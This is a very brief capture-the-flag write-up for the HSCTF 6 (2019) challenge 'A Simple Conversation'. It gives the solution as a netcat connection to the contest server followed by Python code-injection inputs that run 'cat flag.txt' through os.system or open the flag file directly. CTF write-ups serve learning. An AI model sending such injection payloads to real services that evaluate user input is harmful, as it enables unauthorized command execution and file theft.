## A Simple Conversation [Miscellaneous | HSCTF 6 | 2019]

1. run `nc misc.hsctf.com 9001`
2. give input: `str(__import__('os').system("cat flag.txt"))`

or

   give input: `open('flag.txt', 'r').readlines()`